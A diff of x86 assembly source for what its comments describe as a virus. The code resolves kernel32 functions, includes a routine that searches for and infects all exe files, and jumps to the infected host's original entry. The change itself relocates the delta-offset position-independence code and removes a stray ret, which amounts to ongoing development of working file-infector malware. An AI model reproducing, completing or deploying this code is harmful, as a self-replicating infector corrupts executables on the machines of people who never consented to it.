@@ -71,11 +71,6 @@ start: ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *
 
     mov     esi, [esp]                  ; Look for last eip which was in kernel32.dll, and is now on the stack because of the call from there.
 
-    call    delta_offset				; Get delta offset for position independence.
-delta_offset:
-    pop     ebx
-    sub     ebx, delta_offset           ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.
-
 main PROC NEAR
 
     LOCAL   getProcAddress_addr:DWORD
@@ -99,6 +94,11 @@ main PROC NEAR
 	LOCAL	setfilepointer_addr:DWORD
 	LOCAL	virtualalloc_addr:DWORD
 	LOCAL	writefile_addr:DWORD
+
+    call    delta_offset				; Get delta offset for position independence.
+delta_offset:
+    pop     ebx
+    sub     ebx, delta_offset           ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.
 
 include	search_k32.asm								; Search Kernel32.dll base address and resolves GetProcAddress and LoadLibraryA function addresses.
 
@@ -146,7 +146,6 @@ include	search_files.asm							; Loop for searching and infecting all exe files 
 	leave								; Epilogue. Because of the jmp, the epilogue of the current procedure will never be executed, therefore this one is here.
 	jmp		ecx							; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.
 
-    ret
 main ENDP
 
 exit:
